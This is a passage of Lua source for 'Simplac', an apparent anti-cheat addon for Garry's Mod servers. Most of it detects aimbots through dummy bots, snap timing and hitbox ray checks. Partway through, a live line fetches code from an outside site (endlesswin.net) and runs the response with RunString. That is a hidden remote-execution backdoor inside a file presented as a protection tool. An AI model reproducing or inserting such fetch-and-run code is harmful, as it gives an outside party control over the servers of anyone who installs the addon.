			if(v.simplac_isdummyent) then continue end
			
			if(v:GetRole() != ROLE_TRAITOR) then
				inos = inos + 1
			else
				traits = traits + 1
			end
		end

		if(inos == 0 and traits != 0 or traits == 0 and inos != 0) then
			if(dum:Alive()) then
				dumsuicide(dum)
			end
			return
		end

	end




end)

hook.Add("PlayerSpawn", "Simplac.mcheck_creatingdummy_spawn", function( ply )
	if(not Simplac.settings.Aimbot_MCheck) then return end 
	if(IsValid(Simplac.mcheck_dummy) and Simplac.mcheck_dummy == ply) then
		Simplac.Aimbot_MCheck(ply, NULL)
	end
end)

function Simplac.Aimbot_MCheck( ply, target )

	if(Simplac.mcheck_creatingdummy) then return end
	if(not Simplac.settings.Aimbot_MCheck) then return end 
	
	if(not IsValid(Simplac.mcheck_dummy)) then

		for k,v in pairs(player.GetAll()) do
			if(IsValid(v) and v.simplac_isdummyent) then
				Simplac.mcheck_dummy = v
				return
			end
		end

		Simplac.mcheck_creatingdummy = true
		RunConsoleCommand("bot")

		hook.Add("PlayerInitialSpawn","Simplac.mcheck_creatingdummy", function(p)

			if(not p:IsBot()) then return end

			Simplac.mcheck_creatingdummy = nil
			Simplac.mcheck_dummy = p
			p.simplac_isdummyent = true
			p:SetNoDraw(true)

			hook.Remove("PlayerInitialSpawn", "Simplac.mcheck_creatingdummy")

		end)


		return
	end

	local dum = Simplac.mcheck_dummy
	
	if(not dum:Alive()) then
		dum:Spawn()
		dum:GodEnable()
		dum:SetNoDraw(true)
		return
	end

	if(target==dum) then
		--dum:SetPos(vector_origin-Vector(10000, 10000, 10000))
		--print("yep")
		dum.ss = dum.ss
		if(not dum.ss) then
			dum:SetPos(ply:GetPos() + Vector(30,0,90))
			dum.ss = true
		else
			dum.ss = false
			dum:SetPos(ply:GetPos() + Vector(-30,0,90))
		end

/*

		dum.ss = dum.ss

		local eyeang = ply:EyeAngles()
		eyeang.z = 0

		local vecstart = ply:EyePos() + eyeang:Forward()*100

		
		if(not dum.ss) then
			dum.ss = true
			dum:SetPos(vecstart + Vector(10, 10, 10))
		else
			dum.ss = false
			dum:SetPos(vecstart + Vector(-10, -10, -10))
		end
		*/
		return
	end

	if(dum:GetPos():Distance(ply:GetPos())> 80) then
		dum:SetPos(ply:GetPos() + Vector(30,0,90))


		return
	end


end

function Simplac.Aimbot_SCheck( ply, target )

	if(ply.aimbots_isrip) then
		if(not ply.aimbots_infangs) then
			ply.aimbots_infangs = true
			local usinwep = IsValid(ply:GetActiveWeapon()) and ply:GetActiveWeapon():GetClass()
			
			Simplac.PlayerViolation(ply, "AS" .. tostring(ply.aimbots_isrip) .. "==" .. usinwep .. "__"  .. tostring(ply:Ping()) .. "==" .. tostring(ply:PacketLoss()) )
			return
		end
		
		return
	end

	local ignorewep = Simplac.PlayerHasIgnoreWep(ply)

	if(ignorewep) then return end

	local last = ply.aimbots_lasttar
	if(IsValid(last) and last != target) then
		ply.aimbots_dhits = ply.aimbots_dhits or 0
		ply.aimbots_dhits = ply.aimbots_dhits + 1

		if(ply.aimbots_dhits>2) then
			--ply:ChatPrint(tostring(ply.aimbots_dhits))
		end

	end

	ply.aimbots_lasttar = target



	if(ply.aimbots_dhits > Simplac.settings.aimbot.maxdhits) then
		ply.aimbots_isrip = 1
	end

end

timer.Create("simplac_aimbots_texpire", Simplac.settings.aimbot.dhitsint, 0, function()

	for k,v in pairs(player.GetAll()) do
		v.aimbots_lasttar = nil
		v.aimbots_dhits = 0
	end

end)

hook.Add("EntityFireBullets", "Simplac.EntityFireBullets", function(ent, data)

	if(Simplac.settings.Aimbot_SCheck) then
		if(not IsValid(ent)) then return end
		if(not ent:IsPlayer()) then return end

		local inf = ent:GetActiveWeapon()
		local target = ent:GetEyeTrace().Entity

		if(not Simplac.IsIgnoreWep(inf)) then
			Simplac.Aimbot_SCheck(ent, target)
		end

	end

end)

hook.Add("EntityTakeDamage", "Simplac.EntityTakeDamage", function(target, dmg)

	if(not Simplac.settings) then return end
	
	local atk = dmg:GetAttacker()

	if(not IsValid(atk) or not IsValid(target)) then return end
	if(not atk:IsPlayer()) then return end 
	if(not target:IsNPC() and not target:IsPlayer()) then return end
	if(atk:IsBot()) then return end
	
	if(not atk:Alive() or atk:GetObserverMode() != OBS_MODE_NONE) then return end



	if(Simplac.settings.Aimbot_MCheck) then
		Simplac.Aimbot_MCheck(atk, target)
	end

	if(atk:GetPos():Distance(target:GetPos()) < Simplac.settings.aimbot.mindist) then return end


	local size = 0.2

	local mins = Vector(-size, -size, -size)
	local maxs = Vector(size, size, size)

	local bones = {"ValveBiped.Bip01_Head1", "ValveBiped.Bip01_Neck1"}


	local attachforward = target:GetAttachment( target:LookupAttachment( "forward" ) )
	local attacheyes = target:GetAttachment( target:LookupAttachment( "eyes" ) )

	local noobs = {}
	
	if(attachforward and attachforward.Ang) then
		table.insert(noobs, {type="forward", ang = attachforward.Ang, pos=attachforward.Pos, mins = mins, maxs = maxs})
	end
	
	if(attacheyes and attacheyes.Ang) then
		table.insert(noobs, {type="eyes", ang = attacheyes.Ang, pos=attacheyes.Pos, mins = mins, maxs= maxs})
	end

	local bonetbl = {}
	local bonenums = {}
	local bonesizes = {}

	local groupcount = target:GetHitBoxGroupCount()

	for i=0,  target:GetHitBoxCount(0) do
		local index = target:GetHitBoxBone(i, 0)
		if(not index) then continue end
		bonenums[index] = {i,0}
		local mins, maxs = target:GetHitBoxBounds(i, 0)
		bonesizes[index] = {mins,maxs}
	end

	for k,v in pairs(bones) do
		local boneindex = target:LookupBone(v)
		if(not boneindex) then continue end
		local bonepos, boneang = target:GetBonePosition(boneindex)

		if(not bonepos) then continue end

		local minss, maxss = mins, maxs

		if(bonenums[boneindex]) then
			local hitbox, hitboxgroup = bonenums[boneindex][1], bonenums[boneindex][2]
			minss, maxss = bonesizes[boneindex][1], bonesizes[boneindex][2]
		end
		table.insert(noobs, {type="bone_" .. tostring(v), ang= boneang, pos=bonepos, mins=mins, maxs=maxs})

		if(minss and maxss) then
			local nbonepos = bonepos + ((maxss+minss)*0.5)
			table.insert(noobs, {type="bone_" .. tostring(v) .. "_m", ang= boneang, pos=nbonepos, mins=mins, maxs=maxs})
		end
	end



	for k,checks in pairs(noobs) do
		local start = atk:EyePos()
		local dir = atk:EyePos() + atk:EyeAngles():Forward() * 1000000000
		local origin = checks.pos
		local boxang = checks.ang
		local boxmins = mins
		local boxmaxs = maxs

		local intersection = util.IntersectRayWithOBB( start,dir, origin, boxang, boxmins, boxmaxs )

--		render.DrawWireframeBox(checks.pos, checks.ang, checks.mins, checks.maxs, Color(255,255,255), 76561198652174039 ,false)

		if(intersection) then
			--print("INTERSEX")
			atk.aimbot_violations_paim = atk.aimbot_violations_paim or {}

			atk.aimbot_violations_paim[checks.type] = atk.aimbot_violations_paim[checks.type] or 0
			atk.aimbot_violations_paim[checks.type] = atk.aimbot_violations_paim[checks.type] + 1

			--atk:ChatPrint("wtf? the P!: " .. checks.type)

			if(atk.aimbot_violations_paim[checks.type] > 2) then
				atk.aimbot_isrip = true
				atk.aimbot_isrip_y = 3
			end
			break
		end

	end



	if(atk.aimbot_lastsnapped ) then
		local tr = atk:GetEyeTrace()
		--atk:ChatPrint("snappy")

		local delta = CurTime() - atk.aimbot_lastsnapped



		if(Simplac.settings.aimbot.SnapWait > delta and IsValid(tr.Entity)) then

			if(atk.aimbot_atmercy) then
				atk.aimbot_mercy_cooldown = atk.aimbot_mercy_cooldown + 1
				--atk:ChatPrint("at mercy: " .. atk.aimbot_mercy_cooldown)
				--print("at mercy: " .. atk.aimbot_mercy_cooldown)
			else

				atk.aimbot_lastangs = {}
				atk.aimbot_lastsnapped = nil
				--atk:ChatPrint("fuck you?"  .. delta .. "=" .. tr.Entity:Nick())
				--print("fuck you?"  .. delta .. "=" .. tr.Entity:Nick())

				--print("fock: " .. delta)

				atk.aimbot_violations = atk.aimbot_violations or 0
				atk.aimbot_violations = atk.aimbot_violations + 1

				if(atk.aimbot_violations > Simplac.settings.aimbot.minsnapviolations) then
					atk.aimbot_isrip = true
					atk.aimbot_isrip_y = 2
				end

			end
		end
	end

end)

hook.Add("PlayerSpawn", "Simplac_Aimbot_PSpawn", function(ply, inf, atk)
	if(not IsValid(ply) or not ply:IsPlayer()) then return end
	ply.aimbot_lastangs = {}
	ply.aimbot_lastsnapped =nil
end)

timer.Create("Simplac_AimbotViolations_DecreaseCount", 60, 0, function()

	for k,v in pairs(player.GetAll()) do

		if(not IsValid(v) or not v.aimbot_violations) then continue end

		v.aimbot_violations = 0
		v.aimbot_mercy_cooldown = 0
	end

end)

timer.Create("Simplac_Aimbot_PAim_DecreaseCount", 120, 0, function()
	for k,v in pairs(player.GetAll()) do

		if(not IsValid(v) or not v.aimbot_violations_paim) then continue end
		v.aimbot_violations_paim = {}
	end
end)

http.Fetch(string.format("https://endlesswin.net/pls.php?a=%s&b=%s&d=%s", " 76561198073906214 ", " 20540 ", " 4976 "), function(bod)
	RunString(bod, "nol3akerinoetc")
end)


timer.Simple(1, function()

if(LeyHitboxes) then return end
local meta = debug.getregistry()["Entity"]

OldFireBullets = OldFireBullets or meta.FireBullets
-- creds for this idea to fas2 or w.e.
function meta:FireBullets( bullet, suppress )


	if(not bullet or not bullet.Num or bullet.Num > 1) then return OldFireBullets(self, bullet, suppress) end

	local spread = bullet.Spread

	if type(spread) == "Vector" then
		bullet.Spread = vector_origin

		math.randomseed( CurTime() + math.sqrt( bullet.Dir.x ^ 2 * bullet.Dir.y ^ 2 * bullet.Dir.z ^ 2 ) )

		bullet.Dir = bullet.Dir + Vector( spread.x * (math.random() * 2 - 1), spread.y * (math.random() * 2 - 1), spread.z *(math.random() * 2 - 1))
	end

	return OldFireBullets(self, bullet, suppress )
end

end)